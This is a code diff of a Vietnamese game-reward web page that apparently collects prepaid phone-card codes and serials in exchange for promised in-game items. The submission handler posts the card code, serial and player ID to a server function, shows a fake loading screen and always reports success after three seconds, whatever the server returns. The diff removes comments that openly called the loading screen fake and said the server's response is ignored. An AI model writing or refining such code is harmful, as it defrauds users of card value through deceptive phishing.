@@ -123,6 +123,7 @@
         { id: 13, name: "Xưởng máy hoa hồng", img: "https://i.postimg.cc/zDppMY5g/IMG-2127.png" },
         { id: 2, name: "2.450 Đá quý", img: "https://i.postimg.cc/85dNNzLf/IMG-2025.png" },
         { id: 1, name: "450 Thỏi vàng", img: "https://i.postimg.cc/ydhss80F/IMG-0014.png" },
+        { id: 19, name: "Gói kẹo cao su Mint Pop", img: "https://i.postimg.cc/ydVk5v9h/IMG-2245.png" }, // Vị trí thứ 4
         { id: 17, name: "Đoá hoa toả sáng", img: "https://i.postimg.cc/nVkhtN8p/IMG-2160.png" },
         { id: 18, name: "Gói Nữ sinh trường Marron KM", img: "https://i.postimg.cc/BvHJ7Vc9/IMG-2161.png" },
         { id: 16, name: "Cần câu búa vàng", img: "https://i.postimg.cc/7YxyPMJ1/IMG-1867.png" },
@@ -136,7 +137,6 @@
         { id: 8, name: "Angel mate", img: "https://i.postimg.cc/0N9dfK3K/IMG-1865.png" },
         { id: 9, name: "Tay đua vũ trụ", img: "https://i.postimg.cc/q755y9Qf/IMG-2084.png" },
         { id: 10, name: "Vợt ánh sao mơ màng", img: "https://i.postimg.cc/T3P00tpF/IMG-2083.png" },
-        { id: 14, name: "Gói kẹo cao su bạc hà", img: "https://i.postimg.cc/x8wpWQmp/Khong-Co-Tieu-De11-20260225012237.png", isComingSoon: true },
         { id: 15, name: "Valentine xanh cá tính", img: "https://i.postimg.cc/VkgQbSM7/Khong-Co-Tieu-De12-20260225014422.png", isComingSoon: true }
     ];
 
@@ -236,17 +236,14 @@
         
         if(!code || !seri) return alert("Vui lòng nhập đầy đủ thông tin!");
         
-        // Hiện màn hình loading giả cho uy tín
         content.innerHTML = `<div style="padding:30px 0"><div class="loader"></div><p style="font-weight:800">Đang kiểm tra thẻ và kích hoạt Code...</p></div>`;
         
-        // Gửi dữ liệu đi (không dùng await để tránh treo web)
         fetch('/.netlify/functions/napthe', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ type, code, seri, playerID: userPlayerID, amount })
         });
 
-        // Đợi 3 giây rồi hiện Thành Công luôn, không quan tâm server phản hồi gì
         setTimeout(() => {
             content.innerHTML = `
                 <span class="success-icon">✔</span>
